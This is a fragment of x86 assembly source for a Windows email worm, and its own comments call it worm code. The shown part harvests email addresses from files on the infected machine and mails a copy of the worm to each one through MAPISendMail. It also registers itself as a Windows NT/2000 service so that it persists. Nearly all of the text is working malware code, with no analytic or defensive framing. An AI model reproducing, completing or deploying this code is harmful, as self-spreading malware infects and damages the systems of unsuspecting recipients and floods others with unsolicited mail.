ph_close3:
	push	esi
	call	UnmapViewOfFile				;unmap view of file
ph_close2:
	push	ebp
	call	CloseHandle				;close file mapping
ph_close:
	push	ebx
	call	CloseHandle				;close the file
	popad
	ret

scan_mail:
	xor	edx,edx
	add	esi,7
	mov	edi,offset mail_address			;where to store the
	push	edi					;mail address
n_char:	lodsb
	cmp	al,' '
	je	s_char
	cmp	al,'"'
	je	e_char
	cmp	al,''''
	je	e_char
	cmp	al,'@'
	jne	o_a
	inc	edx
o_a:	stosb
	jmp	n_char
s_char:	inc	esi
	jmp	n_char
e_char:	xor	al,al
	stosb
	pop	edi
	test	edx,edx					;if EDX=0, mail is not
	je	ls_scan_mail				;valid (no '@')

	call	mapi_send
	jmp	ls_scan_mail
SPREAD_Thread	EndP


;send itself to specified mail address via MAPI32
mapi_send:
	xor	eax,eax
	push	eax
	push	eax
	push	offset lpMessage
	push	eax
	push	[MAPIHandle]
	call	MAPISendMail
	ret


;register service process under WinNT/2k
SVCRegister	Proc
	call	_dt
	dd	offset up_xtc+5
	dd	offset service_start
	dd	0
	dd	0
_dt:	call	StartServiceCtrlDispatcherA		;make a connection with
	dec	eax					;SCM
	jne	e_svc					;error, continue...

	push	0
	call	ExitThread				;quit the thread

service_start:
	pushad
	@SEH_SetupFrame	<jmp end_worm>

	push	offset SVCHandler
	push	offset up_xtc+5
	call	RegisterServiceCtrlHandlerA		;register service
	test	eax,eax					;handler
	je	e_svc
	push	eax

	call	_ss
ss_:	dd	10h or 20h
	dd	4
	dd	0
	dd	0
	dd	0
	dd	0
	dd	0
_ss:	push	eax
	call	SetServiceStatus			;set the service status
	call	CloseServiceHandle			;close service handle
	jmp	e_svc					;and continue...
SVCRegister	EndP

end	Start						;end of worm code
